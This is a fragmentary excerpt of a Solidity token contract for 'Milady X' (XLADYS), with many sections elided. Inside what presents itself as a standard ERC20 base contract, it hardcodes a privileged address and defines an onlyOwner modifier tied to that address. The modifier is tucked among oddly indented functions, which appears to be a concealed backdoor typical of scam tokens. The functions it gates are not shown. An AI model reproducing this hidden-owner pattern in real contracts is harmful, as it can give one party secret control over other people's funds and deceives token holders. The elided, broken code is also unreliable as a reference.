...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public XLADYSnuwebsite = "https://XLADYS.com/";
    string public XLADYSnuADDRESS = "0xB9923725a8D50e779C0fdebF49ffBD081e0bcA6d";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleXLADYSnu;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleXLADYSnu = 0xB9923725a8D50e779C0fdebF49ffBD081e0bcA6d;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getXLADYSnuwebsite() public view returns (string memory) {
        return XLADYSnuwebsite;
    } 


               function getXLADYSnuADDRESS() public view returns (string memory) {
        return XLADYSnuADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleXLADYSnu);
        _;
    }    
    function _approve(
        address owner,
...
contract XLADYS is ERC20, Ownable {
    constructor () ERC20("Milady X", "XLADYS") 
    {    
